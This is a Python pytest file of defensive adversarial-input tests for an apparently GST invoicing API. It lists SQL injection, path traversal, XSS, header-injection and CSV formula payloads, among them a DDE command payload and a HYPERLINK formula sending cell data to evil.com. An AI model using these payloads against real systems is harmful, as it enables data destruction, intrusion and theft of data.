"""M6 adversarial input testing: inputs crafted to break assumptions at every
surface that accepts them.

Covers:
1. SQL injection attempts through text fields (GSTIN, names, search).
2. Path traversal in uploaded filenames.
3. XSS / HTML injection in text fields.
4. Control characters and Unicode edge cases through the API.
5. Oversized and malformed payloads.
6. CSV formula injection in fields that reach exports.
7. GSTIN fuzzing: almost-valid, control chars, SQL, overflow.
8. File upload adversarial content types and names.
"""
from __future__ import annotations

import io

import pytest

from app.core.sanitize import (
    clean_text,
    content_disposition,
    csv_safe,
    encodable,
    escape_like,
    safe_extension,
    safe_filename,
    without_nul,
)

# -----------------------------------------------------------------------
# 1. SQL injection through text fields — none should reach a query
# -----------------------------------------------------------------------

SQL_PAYLOADS = [
    "'; DROP TABLE invoices; --",
    "1 OR 1=1",
    "1' UNION SELECT * FROM users --",
    "admin'--",
    "' OR ''='",
    "1; UPDATE users SET role='owner'",
    "Robert'); DROP TABLE students;--",
]


class TestSqlInjectionInRegistration:

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_in_business_name_does_not_crash(self, client, payload):
        resp = client.post("/api/v1/auth/register", json={
            "email": f"sql{hash(payload) % 9999}@test.com",
            "password": "securepassword123",
            "legal_name": payload,
        })
        assert resp.status_code in (201, 409, 422)
        assert resp.status_code != 500


class TestSqlInjectionInInvoiceUpdate:

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_in_counterparty_name(self, auth_client, payload):
        resp = auth_client.patch(
            "/api/v1/invoices/999999",
            json={"counterparty_name": payload},
        )
        assert resp.status_code in (404, 422)
        assert resp.status_code != 500

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_in_invoice_number(self, auth_client, payload):
        resp = auth_client.patch(
            "/api/v1/invoices/999999",
            json={"invoice_number": payload},
        )
        assert resp.status_code in (404, 422)
        assert resp.status_code != 500


class TestSqlInjectionInSearch:

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_in_invoice_search(self, auth_client, payload):
        resp = auth_client.get("/api/v1/invoices", params={"search": payload})
        assert resp.status_code in (200, 422)
        assert resp.status_code != 500

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_in_supplier_search(self, auth_client, payload):
        resp = auth_client.get("/api/v1/suppliers", params={"search": payload})
        assert resp.status_code in (200, 422)
        assert resp.status_code != 500


# -----------------------------------------------------------------------
# 2. Path traversal in uploaded filenames
# -----------------------------------------------------------------------

TRAVERSAL_FILENAMES = [
    "../../../etc/passwd",
    "..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc/passwd",
    "invoice\x00.pdf",
    "/etc/shadow",
    "C:\\Windows\\win.ini",
    "invoice/../../../etc/passwd.pdf",
]


class TestPathTraversalInUploadFilename:

    @pytest.mark.parametrize("name", TRAVERSAL_FILENAMES)
    def test_traversal_is_neutralised_by_safe_filename(self, name):
        safe = safe_filename(name)
        assert ".." not in safe
        assert "/" not in safe
        assert "\\" not in safe
        assert "\x00" not in safe

    @pytest.mark.parametrize("name", TRAVERSAL_FILENAMES)
    def test_upload_with_traversal_filename_does_not_escape(self, auth_client, name):
        content = b"Invoice No: TRAV-001\nDate: 01/05/2026\nTotal: 1000.00\n"
        if name.lower().endswith(".pdf"):
            # A name ending .pdf is read as a PDF, so its bytes must be one
            # (see TestAFileIsWhatItSaysItIs); this test is about the name.
            content = b"%PDF-1.4\n" + content
        resp = auth_client.post(
            "/api/v1/invoices/upload",
            files={"file": (name, io.BytesIO(content), "text/plain")},
        )
        assert resp.status_code in (201, 422)
        assert resp.status_code != 500
        if resp.status_code == 201:
            body = resp.json()
            inv = body.get("invoice", body)
            stored_name = inv.get("original_filename", inv.get("filename", ""))
            assert ".." not in stored_name


# -----------------------------------------------------------------------
# 3. XSS / HTML injection in text fields
# -----------------------------------------------------------------------

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    '<img src=x onerror="alert(1)">',
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    '"><script>alert(document.cookie)</script>',
    "<iframe src='https://evil.com'></iframe>",
    "{{7*7}}",
    "${7*7}",
]


class TestXssInRegistration:

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_html_in_business_name_does_not_execute(self, client, payload):
        resp = client.post("/api/v1/auth/register", json={
            "email": f"xss{hash(payload) % 9999}@test.com",
            "password": "securepassword123",
            "legal_name": payload,
        })
        assert resp.status_code in (201, 409, 422)
        assert resp.status_code != 500


class TestXssInInvoiceUpdate:

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_html_in_counterparty_name(self, auth_client, payload):
        resp = auth_client.patch(
            "/api/v1/invoices/999999",
            json={"counterparty_name": payload},
        )
        assert resp.status_code in (404, 422)
        assert resp.status_code != 500


# -----------------------------------------------------------------------
# 4. Control characters and Unicode edge cases
# -----------------------------------------------------------------------

class TestControlCharactersThroughTheApi:

    def test_nul_bytes_in_a_name_do_not_crash(self, client):
        resp = client.post("/api/v1/auth/register", json={
            "email": "nul@test.com",
            "password": "securepassword123",
            "legal_name": "Test\x00Company",
        })
        assert resp.status_code in (201, 409, 422)
        assert resp.status_code != 500

    def test_bidi_override_in_a_name(self, client):
        resp = client.post("/api/v1/auth/register", json={
            "email": "bidi@test.com",
            "password": "securepassword123",
            "legal_name": "Normal \u202edesrever Company",
        })
        assert resp.status_code in (201, 409, 422)

    def test_zero_width_characters_in_a_name(self, client):
        resp = client.post("/api/v1/auth/register", json={
            "email": "zws@test.com",
            "password": "securepassword123",
            "legal_name": "Test\u200bCompany\u200b",
        })
        assert resp.status_code in (201, 409, 422)

    def test_surrogate_half_in_json_does_not_crash(self):
        result = encodable({"name": "test\ud800value"})
        assert isinstance(result, dict)
        val = result["name"]
        assert isinstance(val, str)
        val.encode("utf-8")


class TestUnicodeEdgeCases:

    def test_decomposed_vs_composed_through_clean_text(self):
        composed = "caf\u00e9"
        decomposed = "cafe\u0301"
        assert clean_text(composed) == clean_text(decomposed)

    def test_a_10k_character_field_is_truncated(self):
        long_text = "A" * 10_000
        result = clean_text(long_text)
        assert result is not None
        assert len(result) == 500

    def test_only_control_characters_becomes_none(self):
        assert clean_text("\x00\x01\x02\x03") is None

    def test_mixed_scripts_survive(self):
        mixed = "GST भारत 税金 الضريبة"
        result = clean_text(mixed)
        assert result is not None
        assert "GST" in result
        assert "भारत" in result


# -----------------------------------------------------------------------
# 5. Oversized and malformed payloads
# -----------------------------------------------------------------------

class TestOversizedPayloads:

    def test_an_extremely_long_email_is_refused(self, client):
        resp = client.post("/api/v1/auth/register", json={
            "email": "a" * 500 + "@test.com",
            "password": "securepassword123",
            "legal_name": "Test",
        })
        assert resp.status_code == 422

    def test_a_very_long_password_is_refused(self, client):
        resp = client.post("/api/v1/auth/register", json={
            "email": "longpw@test.com",
            "password": "A" * 200,
            "legal_name": "Test",
        })
        assert resp.status_code == 422

    def test_a_very_long_gstin_is_refused(self, auth_client):
        resp = auth_client.patch(
            "/api/v1/invoices/999999",
            json={"counterparty_gstin": "A" * 100},
        )
        assert resp.status_code == 422

    def test_a_deeply_nested_json_is_refused(self, client):
        payload = {"key": "value"}
        for _ in range(50):
            payload = {"nested": payload}
        resp = client.post(
            "/api/v1/auth/register",
            json=payload,
        )
        assert resp.status_code == 422


# -----------------------------------------------------------------------
# 6. CSV formula injection
# -----------------------------------------------------------------------

FORMULA_LEADERS = ["=CMD()", "+CMD()", "-1+1", "@SUM(A1)", "\t=1", "\r=1"]


class TestCsvFormulaInjection:

    @pytest.mark.parametrize("leader", FORMULA_LEADERS)
    def test_a_formula_leader_is_defused(self, leader):
        safe = csv_safe(leader)
        assert safe.startswith("'")

    def test_the_dde_payload_is_neutralised(self):
        payload = "=cmd|'/c calc'!A0"
        safe = csv_safe(payload)
        assert safe.startswith("'")
        assert not safe.startswith("=")

    def test_the_hyperlink_exfiltration_is_neutralised(self):
        payload = '=HYPERLINK("http://evil.com/?"&A2,"Click")'
        safe = csv_safe(payload)
        assert safe.startswith("'")

    def test_an_ordinary_name_is_untouched(self):
        assert csv_safe("Umang Traders") == "Umang Traders"

    def test_none_and_empty_give_empty(self):
        assert csv_safe(None) == ""
        assert csv_safe("") == ""


# -----------------------------------------------------------------------
# 7. GSTIN fuzzing
# -----------------------------------------------------------------------

GSTIN_FUZZ = [
    "",
    "A",
    "27AAPFU0939F1ZV' OR '1'='1",
    "27AAPFU0939F1ZV; DROP TABLE",
    "\x00" * 15,
    "A" * 1000,
    "<script>alert(1)</script>",
    "27AAPFU0939F1Z\u200bV",
]


class TestGstinFuzzing:

    @pytest.mark.parametrize("gstin", GSTIN_FUZZ)
    def test_a_fuzzed_gstin_in_registration_does_not_crash(self, client, gstin):
        resp = client.post("/api/v1/auth/register", json={
            "email": f"gstin{hash(gstin) % 99999}@test.com",
            "password": "securepassword123",
            "legal_name": "Test Business",
            "gstin": gstin,
        })
        assert resp.status_code in (201, 409, 422)
        assert resp.status_code != 500

    @pytest.mark.parametrize("gstin", GSTIN_FUZZ)
    def test_a_fuzzed_gstin_in_invoice_update_does_not_crash(
        self, auth_client, gstin,
    ):
        resp = auth_client.patch(
            "/api/v1/invoices/999999",
            json={"counterparty_gstin": gstin},
        )
        assert resp.status_code in (404, 422)
        assert resp.status_code != 500


# -----------------------------------------------------------------------
# 8. File upload adversarial content types and names
# -----------------------------------------------------------------------

class TestFileUploadAdversarial:

    def test_a_zero_byte_file_is_handled(self, auth_client):
        resp = auth_client.post(
            "/api/v1/invoices/upload",
            files={"file": ("empty.pdf", io.BytesIO(b""), "application/pdf")},
        )
        assert resp.status_code in (201, 400, 422)
        assert resp.status_code != 500

    def test_a_polyglot_html_pdf_is_handled(self, auth_client):
        content = b"%PDF-1.4<script>alert(1)</script>"
        resp = auth_client.post(
            "/api/v1/invoices/upload",
            files={"file": ("evil.pdf", io.BytesIO(content), "application/pdf")},
        )
        assert resp.status_code in (201, 400, 422)
        assert resp.status_code != 500

    def test_a_file_with_double_extension_is_safe(self, auth_client):
        content = b"Invoice No: DBL-001\nTotal: 1000.00\n"
        resp = auth_client.post(
            "/api/v1/invoices/upload",
            files={"file": ("invoice.pdf.exe", io.BytesIO(content), "text/plain")},
        )
        assert resp.status_code in (201, 400, 422)
        assert resp.status_code != 500

    def test_a_filename_with_only_dots_is_safe(self):
        assert safe_filename("...") != "..."
        assert ".." not in safe_filename("...")

    def test_a_filename_with_embedded_nul_is_safe(self):
        result = safe_filename("invoice\x00.pdf")
        assert "\x00" not in result


# -----------------------------------------------------------------------
# 9. Content-Disposition header injection
# -----------------------------------------------------------------------

class TestContentDispositionInjection:

    def test_newline_in_filename_star_is_percent_encoded(self):
        result = content_disposition("file\r\nX-Evil: yes\r\n.pdf")
        assert "%0D%0A" in result
        star = result.split("filename*=")[1] if "filename*=" in result else ""
        assert "\r" not in star
        assert "\n" not in star

    def test_double_quote_is_escaped(self):
        result = content_disposition('file"name.pdf')
        assert '\\"' in result

    def test_backslash_is_escaped(self):
        result = content_disposition("file\\name.pdf")
        assert "\\\\" in result

    def test_non_ascii_is_percent_encoded_in_star_param(self):
        result = content_disposition("facture_été.pdf")
        assert "UTF-8''" in result
        assert "%" in result


# -----------------------------------------------------------------------
# 10. LIKE wildcard escaping
# -----------------------------------------------------------------------

class TestLikeWildcardEscaping:

    def test_percent_is_escaped(self):
        assert "\\%" in escape_like("%")

    def test_underscore_is_escaped(self):
        assert "\\_" in escape_like("_")

    def test_the_escape_char_itself_is_escaped_first(self):
        result = escape_like("a\\b%c")
        assert result == "a\\\\b\\%c"

    def test_a_bare_wildcard_search_does_not_match_everything(self):
        from app.core.sanitize import search_pattern

        pattern = search_pattern("%")
        assert pattern is not None
        assert "\\%" in pattern


# -----------------------------------------------------------------------
# 11. NUL byte handling
# -----------------------------------------------------------------------

class TestNulByteHandling:

    def test_nul_is_removed_from_strings(self):
        assert without_nul("hello\x00world") == "helloworld"

    def test_nul_in_nested_json(self):
        data = {"a": "x\x00y", "b": ["\x00z", {"c": "w\x00"}]}
        clean = without_nul(data)
        assert clean["a"] == "xy"
        assert clean["b"][0] == "z"
        assert clean["b"][1]["c"] == "w"

    def test_non_text_passes_through(self):
        assert without_nul(42) == 42
        assert without_nul(None) is None


# -----------------------------------------------------------------------
# 12. Unpaired surrogate handling
# -----------------------------------------------------------------------

class TestUnpairedSurrogateHandling:

    def test_a_lone_high_surrogate_is_replaced(self):
        result = encodable("test\ud800end")
        assert isinstance(result, str)
        assert "\ud800" not in result
        result.encode("utf-8")

    def test_a_lone_low_surrogate_is_replaced(self):
        result = encodable("test\udc00end")
        assert isinstance(result, str)
        assert "\udc00" not in result
        result.encode("utf-8")

    def test_a_valid_surrogate_pair_is_kept(self):
        emoji = "\U0001f600"
        assert encodable(emoji) == emoji

    def test_surrogates_in_nested_structures(self):
        data = {"key": "val\ud800ue", "list": ["a\udc00b"]}
        result = encodable(data)
        assert isinstance(result, dict)
        k = result["key"]
        assert isinstance(k, str)
        k.encode("utf-8")
        lst = result["list"]
        assert isinstance(lst, list)
        assert isinstance(lst[0], str)
        lst[0].encode("utf-8")


# -----------------------------------------------------------------------
# 13. Safe extension extraction
# -----------------------------------------------------------------------

class TestSafeExtension:

    def test_a_plain_extension_is_lowercased(self):
        assert safe_extension("report.PDF") == ".pdf"

    def test_no_extension_gives_empty(self):
        assert safe_extension("noext") == ""

    def test_a_non_alphanumeric_extension_is_refused(self):
        assert safe_extension("file.p%df") == ""

    def test_a_double_extension_takes_the_last(self):
        assert safe_extension("file.tar.gz") == ".gz"

    def test_none_gives_empty(self):
        assert safe_extension(None) == ""

    def test_an_absurdly_long_extension_is_bounded(self):
        result = safe_extension("file." + "a" * 100)
        assert len(result) <= 11
